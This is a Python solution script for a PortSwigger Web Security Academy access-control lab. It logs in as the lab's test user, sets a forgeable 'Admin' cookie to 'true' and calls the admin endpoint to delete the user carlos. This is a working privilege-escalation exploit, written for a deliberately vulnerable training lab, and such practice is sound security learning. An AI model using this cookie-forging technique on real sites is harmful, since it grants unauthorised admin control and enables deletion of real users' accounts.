'''This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0abd005e03771ecf805cf8da00ee009b' # change according to generated lab_id
s = requests.Session()


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    token = token_extract(r.text) # login csrf token

    # data for the post request to login
    data = { 'username' : "wiener",
            'password' : "peter",
            'csrf': token
    }
    r2 = s.post(uri, data=data)

    # When logged in, a cookie named Admin is created in the user session. We need to modify this value to 'true'
    for cookie in s.cookies:
        if cookie.name == 'Admin':
            cookie.value = 'true'
            break
    print(s.cookies)

    # Delete carlos and finish the lab
    uri = f"https://{lab_id}.web-security-academy.net/admin/delete?username=carlos"
    r3 = s.get(uri)
    print('finished')


if __name__ == '__main__':
    main()